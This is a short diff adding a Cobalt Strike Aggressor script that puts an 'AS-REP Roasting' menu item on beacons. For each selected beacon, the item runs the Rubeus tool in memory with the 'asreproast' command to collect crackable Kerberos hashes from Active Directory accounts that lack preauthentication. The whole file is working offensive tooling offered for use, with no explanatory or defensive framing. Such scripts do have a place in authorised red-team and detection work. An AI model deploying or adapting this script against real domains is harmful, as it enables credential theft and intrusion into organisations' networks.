@@ -1,0 +1,12 @@
+item "AS-REP Roasting"{
+			local('$bid');
+				foreach $bid ($1){
+					asreproast($bid);
+				}
+			}
+			
+			
+			
+sub asreproast{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "asreproast");
+}			
